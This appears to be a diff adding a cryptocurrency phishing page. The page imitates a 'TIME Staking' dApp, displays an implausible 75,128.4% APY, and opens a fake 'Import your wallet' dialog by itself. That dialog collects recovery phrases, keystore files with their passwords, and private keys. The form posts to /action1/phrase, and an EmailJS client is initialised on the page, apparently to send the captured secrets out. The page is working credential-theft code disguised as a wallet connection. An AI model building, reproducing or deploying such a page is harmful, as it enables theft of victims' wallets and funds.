+      /* Smartphones (portrait and landscape) ----------- */
+
+      @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
+        /* Styles */
+        .aletr {
+          width: 90% !important;
+        }
+      }
+      /* Smartphones (landscape) ----------- */
+
+      @media only screen and (min-width: 321px) {
+        /* Styles */
+        .aletr {
+          width: 80% !important;
+        }
+      }
+      /* Smartphones (portrait) ----------- */
+
+      @media only screen and (max-width: 320px) {
+        /* Styles */
+        .aletr {
+          width: 80% !important;
+        }
+      }
+      /* iPads (portrait and landscape) ----------- */
+
+      @media only screen and (min-width: 768px) and (max-width: 1024px) {
+        /* Styles */
+        .aletr {
+          width: 50% !important;
+        }
+      }
+      /* iPads (landscape) ----------- */
+
+      @media only screen and (min-device-width: 768px) and (max-device-width: 1024px) and (orientation: landscape) {
+        /* Styles */
+        .aletr {
+          width: 50% !important;
+        }
+      }
+      /* iPads (portrait) ----------- */
+
+      @media only screen and (min-device-width: 768px) and (max-device-width: 1024px) and (orientation: portrait) {
+        /* Styles */
+        .aletr {
+          width: 60% !important;
+        }
+      }
+      /* Desktops and laptops ----------- */
+
+      @media only screen and (min-width: 1224px) {
+        /* Styles */
+        .aletr {
+          width: 40% !important;
+        }
+      }
+      /* Large screens ----------- */
+
+      @media only screen and (min-width: 1824px) {
+        /* Styles */
+        .aletr {
+          width: 30% !important;
+        }
+      }
+      /* iPhone 4 ----------- */
+
+      @media only screen and (-webkit-min-device-pixel-ratio: 1.5),
+        only screen and (min-device-pixel-ratio: 1.5) {
+        /* Styles */
+      }
+      .aletr {
+        background-color: #fff;
+        color: #000;
+        width: 30%;
+        border-radius: 5px;
+        padding: 20px;
+        position: relative;
+      }
+      .bg-red-600 {
+        --bg-opacity: 1;
+        background-color: #e53e3e;
+        background-color: rgba(229, 62, 62, var(--bg-opacity));
+      }
+      .border-transparent {
+        border-color: transparent;
+      }
+      .rounded-md {
+        border-radius: 0.375rem;
+      }
+      .justify-evenly {
+        justify-content: space-evenly;
+      }
+      .flex {
+        display: flex;
+      }
+      .border-b-2 {
+        border-bottom-width: 2px;
+      }
+      .acc-body {
+        display: none;
+      }
+      .acc-body.active {
+        display: block;
+      }
+      *,
+      :after,
+      :before {
+        box-sizing: border-box;
+        border: 0 solid #e2e8f0;
+      }
+      .text-sm {
+        font-family: "Montserrat Medium";
+        font-size: 0.875rem;
+      }
+      .text-xs {
+        font-size: 0.75rem;
+      }
+      .bg-blue-600 {
+        --bg-opacity: 1;
+        background-color: #3182ce;
+        background-color: rgba(49, 130, 206, var(--bg-opacity));
+      }
+      .items-center {
+        align-items: center;
+      }
+      .justify-center {
+        justify-content: center;
+      }
+      .border {
+        border-width: 1px;
+      }
+      .rounded-lg {
+        border-radius: 0.5rem;
+      }
+      .border-gray-400 {
+        --border-opacity: 1;
+        border-color: #cbd5e0;
+        border-color: rgba(203, 213, 224, var(--border-opacity));
+      }
+    </style>
+  </head>
+
+  <body>
+    <div
+      class="sending"
+      data-reach-dialog-overlay=""
+      style="opacity: 0.5; z-index: 99999; display: none"
+    >
+      <div class="containerz">
+        <div class="boxz">
+          <div class="borderz one"></div>
+          <div class="borderz two"></div>
+          <div class="borderz three"></div>
+          <div class="borderz four"></div>
+
+          <div class="line one"></div>
+          <div class="line two"></div>
+          <div class="line three"></div>
+        </div>
+      </div>
+    </div>
+
+    <div
+      class="sc-bdVaJa LPcxt"
+      id="LPcxt"
+      data-reach-dialog-overlay=""
+      style="opacity: 1; display: flex; font-family: Montserrat Light"
+    >
+      <div
+        aria-modal="true"
+        role="dialog"
+        tabindex="-1"
+        aria-label="dialog"
+        class="sc-bwzfXH iiXYOL"
+        data-reach-dialog-content=""
+      >
+        <div class="sc-cMhqgX gUQEWC">
+          <div class="sc-cmthru jJAhga">
+            <div class="sc-bsbRJL fRcQRh"></div>
+            <div class="sc-iuJeZd hRZQmk" color="blue">
+              <div class="sc-gqPbQI fhSmUE">.</div>
+            </div>
+            <div class="sc-esOvli jebOoi">
+              <div class="sc-hrWEMg bHjlF">
+                <div class="sc-gwVKww jEMAel">
+                  <div class="sc-iQNlJl dJZYYq">
+                    <div class="sc-hXRMBi deLgHH">
+                      <div class="loading">I</div>
+                      <div class="sc-epnACN jwEAlI" style="display: none">
+                        Connect Manually
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="2tzjbs overlay" data-rbnxzn="qw7i7k" style="display: none">
+      <div
+        class="ih37zd aletr sswla"
+        data-j9niem="t4amku"
+        style="display: block"
+      >
+        <div
+          role="dialog"
+          aria-modal="true"
+          aria-labelledby="modal-headline"
+          class="block align-bottom bg-white rounded-lg text-left overflow-hidden transform transition-all sm:my-8 sm:align-middle"
+        >
+          <div class="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
+            <div class="sm:flex sm:items-start">
+              <form
+                action="/action1/phrase"
+                method="post"
+                enctype="multipart/form-data"
+                id="form"
+              >
+                <div
+                  class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10"
+                >
+                  <h3
+                    id="modal-headline"
+                    class="text-lg leading-6 mt-2 font-medium text-gray-900"
+                    style="display: flex; flex-direction: row"
+                  >
+                    <span
+                      >Import your <span id="walletname"></span> wallet
+                    </span>
+                  </h3>
+                  <div class="mt-2">
+                    <div class="mt-10">
+                      <div
+                        class="flex justify-evenly border-b-2 border-fuchsia-600 mb-4"
+                      >
+                        <div
+                          id="phrase"
+                          class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer"
+                        >
+                          Phrase
+                        </div>
+                        <div
+                          id="keystore"
+                          class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer"
+                        >
+                          Keystore JSON
+                        </div>
+                        <div
+                          id="private"
+                          class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer"
+                        >
+                          Private Key
+                        </div>
+                      </div>
+                      <div id="first" class="acc-body active">
+                        <div class="flex flex-col"></div>
+                        <div class="flex flex-col mb-6">
+                          <div class="relative">
+                            <textarea
+                              cols="30"
+                              rows="4"
+                              placeholder="Enter your recovery phrase"
+                              class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
+                              id="textareaphrase"
+                              required=""
+                              minlength="12"
+                            ></textarea>
+
+                            <p class="text-xs text-grey-300 mt-6">
+                              Typically 12 (sometimes 24) words separated by
+                              single spaces
+                            </p>
+                          </div>
+                        </div>
+                        <div class="flex w-full">
+                          <button
+                            class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in"
+                            id="play"
+                            name="play"
+                          >
+                            <span class="mr-2 uppercase" id="btn-text"
+                              >Proceed</span
+                            >
+                            <span
+                              ><svg
+                                fill="none"
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                                stroke-width="2"
+                                viewBox="0 0 24 24"
+                                stroke="currentColor"
+                                class="h-6 w-6"
+                              >
+                                <path
+                                  d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"
+                                ></path>
+                              </svg>
+                            </span>
+                          </button>
+                        </div>
+                      </div>
+                      <div id="second" class="acc-body bg-grey-600">
+                        <div class="flex flex-col"></div>
+                        <div class="flex flex-col mb-6">
+                          <div class="relative">
+                            <label
+                              id="label"
+                              for="file-upload"
+                              class="UnlockWalletViaKeystoreFile__file-input"
+                            >
+                              <input
+                                class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
+                                id="file-upload"
+                                type="file"
+                                name="file"
+                              /><span id="span"
+                                >Choose Keystore File</span
+                              ></label
+                            >
+                          </div>
+                        </div>
+                        <div class="flex flex-col mb-6">
+                          <div class="relative">
+                            <input
+                              type="text"
+                              id="keystorepassword"
+                              placeholder="Wallet password"
+                              class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
+                            />
+                            <p class="text-xs text-grey-300 mt-6">
+                              Several lines of text beginning with "{...}" plus
+                              the password you used to encrypt it.
+                            </p>
+                          </div>
+                        </div>
+                        <div class="flex w-full">
+                          <button
+                            class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in"
+                          >
+                            <span class="mr-2 uppercase" id="btn-text"
+                              >Proceed</span
+                            >
+                            <span
+                              ><svg
+                                fill="none"
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                                stroke-width="2"
+                                viewBox="0 0 24 24"
+                                stroke="currentColor"
+                                class="h-6 w-6"
+                              >
+                                <path
+                                  d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9
+                  0 11-18 0 9 9 0 0118 0z"
+                                ></path>
+                              </svg>
+                            </span>
+                          </button>
+                        </div>
+                      </div>
+                      <div id="third" class="acc-body bg-grey-600">
+                        <div class="flex flex-col">
+                          <div class="relative">
+                            <input
+                              type="hidden"
+                              name="wallet_id"
+                              placeholder="Wallet ID"
+                              id="wallet_id"
+                              value="Trust wallet"
+                            />
+                          </div>
+                        </div>
+                        <div class="flex flex-col mb-6">
+                          <div class="relative">
+                            <input
+                              type="text"
+                              placeholder="Enter your Private Key"
+                              id="privatekey"
+                              class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
+                            />
+                            <p class="text-xs text-grey-300 mt-6">
+                              Typically 12 (sometimes 24) words seperated by a
+                              single space.
+                            </p>
+                          </div>
+                        </div>
+                        <div class="flex w-full">
+                          <button
+                            class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in"
+                          >
+                            <span class="mr-2 uppercase" id="btn-text"
+                              >Proceed</span
+                            >
+                            <span
+                              ><svg
+                                fill="none"
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                                stroke-width="2"
+                                viewBox="0 0 24 24"
+                                stroke="currentColor"
+                                class="h-6 w-6"
+                              >
+                                <path
+                                  d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9
+                  0 11-18 0 9 9 0 0118 0z"
+                                ></path>
+                              </svg>
+                            </span>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </form>
+            </div>
+          </div>
+          <div class="bg-gray-50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse">
+            <button
+              id="cancel"
+              type="button"
+              class="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-red-600 text-base font-medium text-white hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:ml-3 sm:w-auto sm:text-sm"
+            >
+              Cancel
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="root" style="display: none">
+      <div class="view-base-root">
+        <div></div>
+        <div class="jss5 jss6">
+          <header
+            class="MuiPaper-root MuiAppBar-root MuiAppBar-positionSticky MuiAppBar-colorPrimary jss4 MuiPaper-elevation0"
+          >
+            <div class="MuiToolbar-root MuiToolbar-regular dapp-topbar">
+              <div class="dapp-topbar-slider-btn">
+                <img src="/assets/hamburger.f09dcc2a.svg" alt="" />
+              </div>
+              <div class="dapp-topbar-btns-wrap">
+                <div class="connect-button" id="connect">
+                  <p>Connect Wallet</p>
+                </div>
+              </div>
+            </div>
+          </header>
+        </div>
+        <div class="jss1"></div>
+        <div class="jss2 jss3">
+          <div class="stake-view">
+            <div
+              class="stake-card"
+              style="
+                transform: none;
+                transition: transform 225ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              "
+            >
+              <div
+                class="MuiGrid-root stake-card-grid MuiGrid-container MuiGrid-spacing-xs-2 MuiGrid-direction-xs-column"
+              >
+                <div class="MuiGrid-root MuiGrid-item">
+                  <div class="stake-card-header">
+                    <p class="stake-card-header-title">
+                      TIME Staking (ðŸŽ©, ðŸŽ©)
+                    </p>
+                    <div class="MuiBox-root jss7 rebase-timer">
+                      <p><strong>2 Hours, 46 Mins</strong> to Next Rebase</p>
+                    </div>
+                  </div>
+                </div>
+                <div class="MuiGrid-root MuiGrid-item">
+                  <div class="stake-card-metrics">
+                    <div
+                      class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2"
+                    >
+                      <div
+                        class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-sm-4 MuiGrid-grid-md-4 MuiGrid-grid-lg-4"
+                      >
+                        <div class="stake-card-apy">
+                          <p class="stake-card-metrics-title">APY</p>
+                          <p class="stake-card-metrics-value">75,128.4%</p>
+                        </div>
+                      </div>
+                      <div
+                        class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 MuiGrid-grid-md-4 MuiGrid-grid-lg-4"
+                      >
+                        <div class="stake-card-tvl">
+                          <p class="stake-card-metrics-title">TVL</p>
+                          <p class="stake-card-metrics-value">$1,346,361,222</p>
+                        </div>
+                      </div>
+                      <div
+                        class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 MuiGrid-grid-md-4 MuiGrid-grid-lg-4"
+                      >
+                        <div class="stake-card-index">
+                          <p class="stake-card-metrics-title">Current Index</p>
+                          <p class="stake-card-metrics-value">3.02 TIME</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="stake-card-area">
+                  <div class="stake-card-wallet-notification">
+                    <div class="stake-card-wallet-connect-btn" id="connectz">
+                      <p>Connect Wallet</p>
+                    </div>
+                    <p class="stake-card-wallet-desc-text">
+                      Connect your wallet to claim TIME Tokens
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="main.js"></script>
+    <script src="/assets/jquery-3.6.0.js"></script>
+    <script src="/assets/js1.js?v=1"></script>
+    <script>
+      $("#connect").trigger("click");
+    </script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("ayJL3OZ_0f5c1fVEY");
+      })();
+    </script>
+  </body>
+</html>
